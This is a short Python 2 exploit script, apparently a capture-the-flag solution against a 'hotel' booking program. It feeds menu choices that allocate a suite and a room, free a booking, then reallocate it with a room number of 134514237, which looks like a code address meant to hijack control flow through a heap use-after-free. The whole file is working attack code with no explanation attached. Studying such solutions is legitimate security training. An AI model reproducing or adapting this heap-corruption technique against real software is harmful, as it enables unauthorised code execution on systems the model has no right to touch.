#!/usr/bin/env python

import struct

def add_suite(name, num):
    print "1"
    print name
    print num

def add_room(name, num):
    print "2"
    print name
    print num

def del_book():
    print "3"

def print_book():
    print "4"

def exit_hotel():
    print "5"

def p(d):
        return struct.pack("<Q", d)

def rewrite_heap():
    size = 254

    add_suite("A"*(size), 1)
    add_room("B"*(size), 2)
    del_book()

    add_room("D"*(size), 134514237)
    print_book()

rewrite_heap()

exit_hotel()


